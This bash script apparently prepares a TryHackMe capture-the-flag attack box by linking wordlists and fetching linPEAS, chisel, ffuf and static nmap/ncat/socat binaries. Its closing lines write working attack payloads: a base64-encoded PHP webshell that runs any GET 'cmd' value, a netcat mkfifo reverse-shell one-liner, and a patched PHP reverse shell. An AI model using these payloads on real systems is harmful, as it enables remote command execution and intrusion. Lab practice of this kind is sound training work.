#! /bin/bash

echo "-- THM attack box setup --" 
# intended to be copy pasted into the shell, or run in one command via:
#   curl -s https://raw.githubusercontent.com/ChrisPritchard/ctf-writeups/master/thm-setup.sh | bash

echo "linking wordlists locally"
ln -s /usr/share/wordlists/rockyou.txt rockyou.txt
ln -s /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt directory-list-2.3-medium.txt

echo .git > dirwordlist.txt
cat directory-list-2.3-medium.txt >> dirwordlist.txt

echo "linpeas local copy"
wget -q https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh

echo "quick commands"
echo "docker run -it --rm --name rustscan rustscan/rustscan:latest -a \$1 -- -sV" > rustscan.sh
chmod +x rustscan.sh

echo "tool download scripts"
echo "echo getting ffuf... && go get -u github.com/ffuf/ffuf" > get-ffuf.sh
chmod +x get-ffuf.sh
echo "wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz && gunzip chisel_1.7.6_linux_amd64.gz && mv chisel_1.7.6_linux_amd64 chisel && chmod +x chisel" > get-chisel-linux.sh
chmod +x get-chisel-linux.sh
echo "wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_windows_amd64.gz && gunzip chisel_1.7.6_windows_amd64.gz && mv chisel_1.7.6_windows_amd64 chisel.exe" > get-chisel-windows.sh
chmod +x get-chisel-windows.sh

echo "static binary download scripts"
echo "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap && wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat && wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" > get-static-binaries.sh
chmod +x get-static-binaries.sh

echo "simple php webshell.php"
echo PGZvcm0gbWV0aG9kPSJHRVQiIG5hbWU9Ijw/cGhwIGVjaG8gYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pOyA/PiI+CjxpbnB1dCB0eXBlPSJURVhUIiBuYW1lPSJjbWQiIGlkPSJjbWQiIHNpemU9IjgwIj4KPGlucHV0IHR5cGU9IlNVQk1JVCIgdmFsdWU9IkV4ZWN1dGUiPgo8L2Zvcm0+CjxwcmU+Cjw/cGhwCiAgICBpZihpc3NldCgkX0dFVFsnY21kJ10pKQogICAgewogICAgICAgIHN5c3RlbSgkX0dFVFsnY21kJ10pOwogICAgfQo/Pgo8L3ByZT4KPHNjcmlwdD5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY21kIikuZm9jdXMoKTs8L3NjcmlwdD4K | base64 -d > webshell.php

echo "useful payloads"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(hostname -i) 4444 >/tmp/f" > nc-rev.txt
cp /usr/share/webshells/php/php-reverse-shell.php ./reverse.php && sed -i "s/PUT_THM_ATTACKBOX_IP_HERE/$(hostname -i)/g" reverse.php && sed -i "s/1234/4444/g" reverse.php
